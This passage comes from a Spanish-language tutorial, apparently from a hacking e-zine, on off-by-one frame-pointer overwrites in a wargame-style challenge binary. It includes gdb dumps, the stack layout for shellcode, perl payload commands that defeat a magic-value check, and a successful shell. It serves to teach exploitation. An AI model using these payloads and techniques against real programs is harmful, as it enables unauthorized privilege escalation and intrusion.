+   2) EBP puede ser alterado en un byte con un buffer de 281 caracteres.
+
+Sin necesidad de debuggear, como la instruccion "sub $0x118,%esp" nos dice
+cuantos bytes han sido reservados podemos saber donde comienza el punter "*i"
+que vamos a sobreescribir:
+
+    Direccion "*i" = [ 0xbffff300 ] + 118h - 4 = [ 0xbffff4414 ]
+
+Ahi colocaremos [ DIRECCION DE SC ] y ahi debe apuntar EBP. Repito por enesima
+vez, este valor se copia a ESP, y debido al "popl %ebp" en "main()" debes restar
+cuatro a la direccion. Por lo tanto:
+
+    Nuestro byte modificador sera: [0x14] - 4 = [ 0x10 ]
+
+¿Donde colocar el Shellcode? Para que mas trabajo... al principio del buffer ya
+que tenemos su direccion.
+
+PUES NO!!! Debes fijarte que el ultimo byte de esa direccion es "0x00", un
+byte nulo que finalizara la cadena pasada como argumento frustrando nuestras
+intenciones.
+
+Pero no lo liare mas, hagamos como "klog", rellenemos el principio del buffer
+con instrucciones NOP y saltemos en medio de ellos. 
+
+Tenemos:
+
+     [            BUFFER             ] [ PUNTERO *i ] [     EBP     ] [ EIP ]
+     [      NOPS     ][  SHELLCODE   ] [ 0xbffff330 ] [ 0x10 ]        [ EIP ]
+             ^                         ^
+             0xbffff330                0xbffff4414
+
+Tu mismo puedes intentarlo, ¿verdad?
+
+
+
+---[ 3.2 - GCC 4.1 en Accion
+
+Al comienzo de la seccion 3, cai de nuevo en la tentacion de contaros una
+pequeña mentira, y lo hice. El codigo del reto comprobaba tambien que el
+numero de argumentos no fuera distintos a "2" (nombre programa y primer
+argumento), y lo mas importante y que ahora nos concierne, es que estaba
+compilado con la version 4.1 de GCC.
+
+Que hay de diferente?
+
+1) Gcc-4.1 establece por defecto una proteccion contra los desbordamientos
+   de pila que aborta la ejecucion del programa ante un intento de ataque.
+   Si echamos un vistazo con "gdb" cerca del epilogo de la funcion "f()",
+   observaremos algo como lo siguiente:
+
+   0x080484e0 <f+165>:	call   0x8048390 <__stack_chk_fail@plt>
+   0x080484e5 <f+170>:	leave  
+   0x080484e6 <f+171>:	ret
+
+   Esto nos previene de hacer jugadas no esperadas por el programa. Dije
+   que por defecto esta opcion esta establecida, pero por suerte para
+   etapas de investigacion esta puede ser deshabilitada si pasamos a gcc
+   el paremtro: "-fno-stack-protector", en tiempo de compilacion.
+
+2) El epilogo de la funcion principal "main()" tambien ha cambiado de modo
+   que el valor de %esp ya no es obtenido de %ebp, y nuestros intentos son
+   frustrados:
+
+   0x08048511 <main+159>:  pop    %ebp
+   0x08048512 <main+160>:  lea    0xfffffffc(%ecx),%esp
+   0x08048515 <main+163>:  ret
+
+   Podemos ver que %esp toma el valor final de %ecx menos 4. Solo veras
+   cambiar estos valores si introduces argumentos de tamaño cada vez mas
+   grande y siempre que "-fno-stack-protector" haya sido activado.
+
+Pero entonces, que hay acerca del reto?
+
+Veamos que nos depara gdb tras desensamblar main():
+
+[-----]
+
+(gdb) disass main
+Dump of assembler code for function main:
+0x08048472 <main+0>:    lea    0x4(%esp),%ecx
+0x08048476 <main+4>:    and    $0xfffffff0,%esp
+0x08048479 <main+7>:    pushl  0xfffffffc(%ecx)
+0x0804847c <main+10>:   push   %ebp
+0x0804847d <main+11>:   mov    %esp,%ebp
+0x0804847f <main+13>:   push   %esi
+0x08048480 <main+14>:   push   %ebx
+0x08048481 <main+15>:   push   %ecx
+0x08048482 <main+16>:   sub    $0x2c,%esp
+..........
+..........
+0x080484b1 <main+63>:   call   0x80483fb <f>
+0x080484b6 <main+68>:   cmpl   $0xdefaced,0xfffffff0(%ebp)
+0x080484bd <main+75>:   jne    0x8048506 <main+148>
+0x080484bf <main+77>:   call   0x8048330 <geteuid@plt>
+0x080484c4 <main+82>:   mov    %eax,%ebx
+0x080484c6 <main+84>:   call   0x8048330 <geteuid@plt>
+0x080484cb <main+89>:   mov    %eax,%esi
+0x080484cd <main+91>:   call   0x8048330 <geteuid@plt>
+0x080484d2 <main+96>:   mov    %ebx,0x8(%esp)
+0x080484d6 <main+100>:  mov    %esi,0x4(%esp)
+0x080484da <main+104>:  mov    %eax,(%esp)
+0x080484dd <main+107>:  call   0x80482f0 <setresuid@plt>
+0x080484e2 <main+112>:  movl   $0x0,0xc(%esp)
+0x080484ea <main+120>:  movl   $0x8048628,0x8(%esp)
+0x080484f2 <main+128>:  movl   $0x804862b,0x4(%esp)
+0x080484fa <main+136>:  movl   $0x804862b,(%esp)
+0x08048501 <main+143>:  call   0x8048300 <execlp@plt>
+..........
+..........
+0x08048511 <main+159>:  pop    %ebp
+0x08048512 <main+160>:  lea    0xfffffffc(%ecx),%esp
+0x08048515 <main+163>:  ret
+End of assembler dump.
+(gdb)
+
+[-----]
+
+Lo primero que podemos notar es que el prologo es distinto, sintoma del cambio
+de version en el compilador. Pero la parte mas importante se encuentra aqui:
+
+     0x080484b1 <main+63>:   call   0x80483fb <f>
+     0x080484b6 <main+68>:   cmpl   $0xdefaced,0xfffffff0(%ebp)
+
+A pesar de Gcc-4.1, EBP puede ser alterado siempre que "-fno-stack-protector"
+este establecido. Una vez regresamos de "f()", la siguiente instruccion compara
+si en la posicion de memoria "EBP - 10" se encuentra el valor "0x0defaced".
+
+Pero, que hay en esa posicion tras haber modificado %ebp?
+
+[-----]
+
+(gdb) break *main+42                // Despues de f() y antes de la comparacion
+Breakpoint 1 at 0x8048490
+
+(gdb) run `perl -e 'print "A"x281'` // Suficiente para alterar un byte en EBP 
+Starting program: /home/blackngel/pruebas/bo/f1 `perl -e 'print "A"x281'`
+
+Breakpoint 1, 0x08048490 in main ()
+(gdb) info reg ebp
+ebp            0xbffff441	0xbffff441          // EBP tocado
+
+(gdb) x/24x $ebp
+0xbffff441:	0x00b7ffec	0xa8080485	0x50bffff4	0x02b7e8b4
+0xbffff451:	0xd4000000	0xe0bffff4	0x38bffff4	0x00b7fe2b
+0xbffff461:	0x01000000	0x00000000	0x4a000000	0xf4080482
+0xbffff471:	0xe0b7fbff	0x00b7ffec	0xa8000000	0x81bffff4
+0xbffff481:	0x91ebe8a0	0x00c5682a	0x00000000	0x00000000
+0xbffff491:	0x40000000	0x7db7ff6c	0xf4b7e8b3	0x02b7ffef
+(gdb) x/24x $ebp-40
+0xbffff419:	0xf0bffff4	0xf4080482	0xa4b7fbff	0xe8080496
+0xbffff429:	0x50000003	0xf4bffff4	0xe0b7fbff	0xa8b7ffec
+0xbffff439:	0x50bffff4	0xe0b7e8b4	0x00b7ffec	0xa8080485
+0xbffff449:	0x50bffff4	0x02b7e8b4	0xd4000000	0xe0bffff4
+0xbffff459:	0x38bffff4	0x00b7fe2b	0x01000000	0x00000000
+0xbffff469:	0x4a000000	0xf4080482	0xe0b7fbff	0x00b7ffec
+(gdb) x/24x $ebp-80
+0xbffff3f1:	0x41414141	0x41414141	0x90bffff4	0x3c080484
+0xbffff401:	0x01bffff6	0x1e000000	0xaebffff6	0x19b7ede1
+0xbffff411:	0xa4b7f83b	0x28080496	0xf0bffff4	0xf4080482
+0xbffff421:	0xa4b7fbff	0xe8080496	0x50000003	0xf4bffff4
+0xbffff431:	0xe0b7fbff	0xa8b7ffec	0x50bffff4	0xe0b7e8b4
+0xbffff441:	0x00b7ffec	0xa8080485	0x50bffff4	0x02b7e8b4
+
+[-----]
+
+Estupendo, en 0xbffff3f1 y 0xbffff3f5 encontramos los ultimos 8 bytes de
+nuestro buffer atacante. Ese contenido no se movera de ahi, ¿pero que ocurre
+si acercamos EBP lo maximo posible? ¿Y que si en vez de escribir caracteres
+"A", repetimos consecutivamente el valor "0x0defaced"?
+
+Utilizaremos el byte alterador "0x01", recuerda que "0x00" es un nulo que pone
+fin a la cadena.
+
+[-----]
+
+(gdb) run `perl -e 'print "\xed\xac\xef\x0d"x65 . "\x01";'`
+...
+...
+Breakpoint 1, 0x08048490 in main ()
+(gdb) info reg ebp
+ebp            0xbffff401	0xbffff401
+
+(gdb) x/24x $ebp-0x10
+0xbffff3f1:	0xed0defac	0xed0defac	0xed0defac	0xed0defac
+0xbffff401:	0xed0defac	0xed0defac	0xed0defac	0xed0defac
+0xbffff411:	0xed0defac	0x010defac	0x90bffff4	0x50080484
+0xbffff421:	0x01bffff6	0x32000000	0xaebffff6	0x19b7ede1
+0xbffff431:	0xa4b7f83b	0x48080496	0xf0bffff4	0xf4080482
+0xbffff441:	0xa4b7fbff	0xe8080496	0x70000003	0xf4bffff4
+
+[-----]
+
+Genial, EBP es [ 0xbffff401 ] y la comparacion consultara [ 0xbffff3f1 ].
+Como observamos una desalineacion de 3 posiciones en el valor, tan solo
+debemos modificar nuestro byte alterador para adaptarlo a la necesidad.
+
+    Byte definitivo: [ 0x04 ]
+
+[-----]
+
+(gdb) run `perl -e 'print "\xed\xac\xef\x0d"x65 . "\x04";'`
+...
+...
+Breakpoint 1, 0x08048490 in main ()
+(gdb) x/16x $ebp-0x10
+0xbffff3f4:	0x0defaced	0x0defaced	0x0defaced	0x0defaced
+0xbffff404:	0x0defaced	0x0defaced	0x0defaced	0x0defaced
+0xbffff414:	0x0defaced	0xbffff404	0x08048490	0xbffff650
+0xbffff424:	0x00000001	0xbffff632	0xb7ede1ae	0xb7f83b19
+
+(gdb) c
+Continuing.
+sh-3.2$ 
+
+[-----]
+
+Todo es posible! };-D
+
+Con lo que acabamos de ver, quiero hacer notar que en la vida real tambien
+existen condiciones en las que ciertos programas pueden ser vulnerados y/o
+explotados.
+
+
+---[ 4 - Conclusion
+
+Este articulo ha venido a demostrar que aun en situaciones limite, existen
+diversas soluciones que pueden ser aplicadas. Debemos ampliar nuestros
+horizontes y alzar bien la vista.
+
+Puede que a veces las explicaciones hayan parecido "for dummies", pero es la
+unica forma de acercar estos temas a los principiantes. Y sinceramente, estoy
+aburrido de leer informacion criptica cuando se puede abordar de un modo mas
+educativo y/o didactico.
+
+Aviso para navegantes: No comprenderas realmente el alcance del problema hasta
+que te enfrentes directamente con el. Eres tu y solo tu el que debe encontrarse
+cara a cara con situaciones conflictivas donde las decisiones deben ser tomadas.
+
+Como siempre, espero que este articulo haya sido de tu agrado.
+
+Un abrazo!
+blackngel
+
+
+*EOF*
